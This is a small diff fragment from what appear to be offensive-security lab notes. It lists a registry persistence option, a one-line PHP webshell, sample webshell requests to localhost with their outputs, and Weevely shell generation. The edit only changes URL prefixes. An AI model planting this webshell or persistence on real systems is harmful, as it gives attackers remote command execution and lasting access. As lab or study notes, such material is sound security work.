@@ -129,11 +129,11 @@ Registry persistence option (New-UserPersistenceOption -Registry -AtLogon)
 
 Simple PHP webshell execution (<?php system($_GET["cmd"]); ?>)
 
-http://localhost/shell.php?cmd=pwd → /var/www/html
+//localhost/shell.php?cmd=pwd → /var/www/html
 
-http://localhost/shell.php?cmd=whoami → www-data
+//localhost/shell.php?cmd=whoami → www-data
 
-http://localhost/shell.php?cmd=ls → listed files (index.html, shell.php)
+//localhost/shell.php?cmd=ls → listed files (index.html, shell.php)
 
 Weevely shell generation (weevely generate mypassword shell.php)
 
